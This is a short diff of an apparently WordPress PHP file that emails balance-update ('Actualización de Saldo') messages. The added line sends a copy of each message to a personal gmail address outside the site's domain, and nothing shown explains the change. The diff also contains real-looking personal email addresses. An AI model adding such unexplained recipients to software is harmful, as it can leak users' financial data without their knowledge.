@@ -36,6 +36,7 @@
         $mensaje = get_email_html($mensaje);    
 
         wp_mail( "a.veloz@kmimos.la", "Actualización de Saldo", $mensaje);
+        wp_mail( "chaudaryy@gmail.com", "Actualización de Saldo", $mensaje);
     }
 
 	exit;
